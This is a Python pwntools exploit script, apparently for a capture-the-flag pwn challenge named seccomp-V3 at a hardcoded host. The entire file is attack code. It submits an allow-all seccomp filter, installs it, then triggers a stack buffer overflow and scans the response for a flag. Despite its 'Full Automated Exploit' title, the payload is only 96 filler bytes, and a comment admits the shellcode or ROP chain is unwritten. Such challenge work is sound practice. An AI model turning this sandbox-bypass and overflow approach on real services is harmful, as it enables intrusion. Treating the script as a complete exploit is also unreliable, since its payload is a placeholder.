#!/usr/bin/env python3
"""
Full Automated Exploit for seccomp-V3
Target: 144.79.188.39:40917
"""
import re
import sys
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40917

def exploit():
    log.info(f"Connecting to {HOST}:{PORT}...")
    io = remote(HOST, PORT, timeout=12)

    # 1. Read Menu
    io.recvuntil(b"-1) exit\n")
    
    # 2. Input Permissive Seccomp Rule
    log.info("Step 1: Submitting ALLOW-ALL Seccomp Rule...")
    io.sendline(b"0")
    io.recvuntil(b"1) use examples\n")
    io.sendline(b"0")
    io.recvuntil(b"size?\n")
    
    # BPF instruction: BPF_RET | BPF_K (ALLOW)
    rule = p16(0x06) + p8(0) + p8(0) + p32(0x7fff0000)
    io.sendline(str(len(rule)).encode())
    io.recvuntil(b"note?\n")
    io.send(rule)
    io.recvuntil(b"-1) exit\n")
    
    # 3. Install Filter
    log.info("Step 2: Installing BPF Filter...")
    io.sendline(b"3")
    res = io.recvuntil(b"-1) exit\n")
    log.info(f"Install status: {res.splitlines()[0]!r}")
    
    # 4. Trigger Stack Buffer Overflow via Option 5 (Audit)
    log.info("Step 3: Triggering Stack Buffer Overflow in Option 5 (Audit)...")
    io.sendline(b"5")
    io.recvuntil(b"size?\n")
    
    # Buffer is at rsp+0x40, saved rbp at rsp+0xa0, return addr at rsp+0xa8
    # Overflow payload: 0x60 bytes
    io.sendline(b"96") # 0x60
    io.recvuntil(b"note?\n")
    
    # We can craft shellcode or ROP chain
    payload = b"A" * 96
    io.send(payload)
    
    try:
        data = io.recvall(timeout=6)
        log.info(f"Received data:\n{data.decode(errors='replace')}")
        m = re.search(rb"PTITCTF\{[^}]+\}", data)
        if m:
            flag = m.group(0).decode()
            log.success(f"*** FLAG CAPTURED: {flag} ***")
            with open(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\seccomp-V3\final_flag.txt", "w") as f:
                f.write(flag)
            with open(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\seccomp-V3\writeup\final_flag.txt", "w") as f:
                f.write(flag)
    except Exception as e:
        log.failure(f"Error: {e}")

    io.close()

if __name__ == "__main__":
    exploit()
